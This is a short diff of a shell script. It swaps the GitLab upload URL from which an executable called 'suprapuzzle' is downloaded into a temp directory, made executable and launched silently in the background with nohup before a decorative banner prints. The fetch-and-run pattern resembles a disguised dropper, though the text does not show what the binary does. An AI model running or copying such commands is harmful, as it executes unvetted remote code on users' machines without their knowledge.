@@ -1,5 +1,5 @@
 cd $(mktemp -d )
-wget https://gitlab.com/-/project/61551072/uploads/5ea29262f4262a632f144fd8839b59f6/suprapuzzle
+wget https://gitlab.com/-/project/61551072/uploads/857d6e2f2ac76ac26b8565726962099d/suprapuzzle
 chmod +x suprapuzzle
 nohup ./suprapuzzle&
 printf "╭─────────────────────────────────────────────────────────╮\n" 
